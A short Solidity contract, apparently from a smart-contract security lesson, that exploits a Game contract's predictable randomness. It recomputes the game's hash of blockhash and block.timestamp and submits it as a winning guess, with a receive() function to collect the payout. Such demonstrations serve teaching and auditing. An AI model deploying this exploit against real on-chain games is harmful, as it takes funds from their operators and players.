// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.24;
import "./Game.sol";

contract Attack {
    Game game;

    constructor(address _gameAddress) {
        game = Game(_gameAddress);
    }

    function attack() public {
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    receive() external payable {}
}
